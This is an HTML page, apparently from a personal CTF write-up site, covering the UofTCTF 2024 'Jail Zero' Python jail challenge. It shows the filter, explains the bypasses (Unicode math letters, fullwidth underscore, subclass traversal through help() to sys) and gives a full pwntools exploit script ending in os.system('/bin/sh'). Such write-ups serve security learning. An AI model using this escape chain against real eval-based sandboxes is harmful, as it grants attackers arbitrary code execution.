@@ -1,0 +1,340 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail/uoftctf-2024-jail-zero.html">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Uoftctf 2024 jail zero - CTF Writeups by @jiegec</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="2"><a href="#uoftctf-2024-jail-zero" class="nav-link">UofTCTF 2024 Jail Zero</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h2 id="uoftctf-2024-jail-zero">UofTCTF 2024 Jail Zero</h2>
+<pre class="highlight"><code class="language-python">def check(code):
+    # no letters
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    # no numbers
+    numbers = "0123456789"
+    # no underscores
+    underscore = "__"
+
+    return not any((c in alphabet) or (c in numbers) or (underscore in code) for c in code)
+
+def safe_eval(code):
+    if (check(code)):
+        g = {'__builtins__': None}
+        l = {'__builtins__': None}
+        return print(eval(code, g, l )) # good luck!
+    else:
+        print("lol no")
+
+code = input("&gt;&gt;&gt; ")
+safe_eval(code)</code></pre>
+<p>Requirements:</p>
+<ol>
+<li>No alphabetic: Use <a href="https://www.compart.com/en/unicode/block/U+1D400">Unicode Block “Mathematical Alphanumeric Symbols”</a> to bypass</li>
+<li>No numbers: Use <code>(''=='')</code> as 1</li>
+<li>No double underscores: Use <a href="https://unicode-explorer.com/c/FF3F">FULLWIDTH LOW LINE</a></li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code></li>
+</ol>
+<p>Then, we can use existing way to get to <code>code.InteractiveConsole().interact()</code>:</p>
+<ol>
+<li>Locate <code>&lt;class '_sitebuiltins._Helper'&gt;</code> and <code>&lt;class '_sitebuiltins._Printer'&gt;</code> in <code>().__class__.__base__.__subclasses__()</code></li>
+<li>Call <code>help()</code> via <code>&lt;class '_sitebuiltins._Helper'&gt;</code> and load <code>code</code> module in help() system</li>
+<li>Locate <code>sys</code> module via <code>&lt;class '_sitebuiltins._Printer'&gt;.__init__.__globals__</code></li>
+<li>Execute <code>sys.modules["code"].InteractiveConsole().interact()</code></li>
+</ol>
+<p>Attack script:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+
+# unicode bypass helper
+def transform(text):
+    encoded = ""
+    # full width low line
+    underscore = chr(0xFF3F)
+    text = text.replace("__", "_" + underscore)
+    for ch in text:
+        if ch.isalpha():
+            if ch &gt;= "a" and ch &lt;= "z":
+                encoded += chr(ord(ch) + 0x1D41A - ord("a"))
+            elif ch &gt;= "A" and ch &lt;= "Z":
+                encoded += chr(ord(ch) + 0x1D400 - ord("A"))
+            else:
+                assert False
+        else:
+            encoded += ch
+    print("before", text)
+    print("after", encoded)
+    return encoded
+
+
+# step 1. locate Helper and Printer
+p = process(["python3", "chal.py"])
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(transform("().__class__.__base__.__subclasses__()").encode())
+res = p.recvline().decode()
+
+helper_index = res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;")
+printer_index = res.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;")
+print("Helper", helper_index)
+print("Printer", printer_index)
+
+# A is 10, B is 100
+
+true = "(''=='')"
+ten = "+".join([true] * 10)
+
+
+def get_index(index):
+    parts = (
+        [true] * (index % 10) + ["A"] * (index // 10 % 10) + ["B"] * (index // 100 % 10)
+    )
+    return "+".join(parts)
+
+
+# H for index of helper
+helper = get_index(helper_index)
+print(helper)
+
+
+# find help text of helper
+p = process(["python3", "chal.py"])
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(
+    transform(
+        f"[A:={ten},B:=A*A,H:={helper},S:=().__class__.__base__.__subclasses__()[H].__doc__]"
+    ).encode()
+)
+help_text = eval(p.recvline().decode())[-1]
+
+# P for index of printer
+
+printer = get_index(printer_index)
+print(printer)
+
+
+# synthesize "sys" and "code"
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p = process(["python3", "chal.py"])
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(
+    transform(
+        f"[A:={ten},B:=A*A,H:={helper},P:={printer},S:=().__class__.__base__.__subclasses__()[H].__doc__,"
+        # step 2. call help()
+        + f"().__class__.__base__.__subclasses__()[H]()(),"
+        # step 3. locate sys module
+        + f"M:=().__class__.__base__.__subclasses__()[P].__init__.__globals__[{synthesize('sys')}],"
+        # step 4. call sys.modules["code"].InteractiveConsole().interact()
+        + f"M.modules[{synthesize('code')}].InteractiveConsole().interact()]"
+    ).encode()
+)
+p.recvuntil(b"help&gt; ")
+# step 2. load code module in help() system
+p.sendline(b"code")
+p.sendline(b"quit")
+p.sendline(b"import os")
+p.sendline(b'os.system("/bin/sh")')
+p.interactive()</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
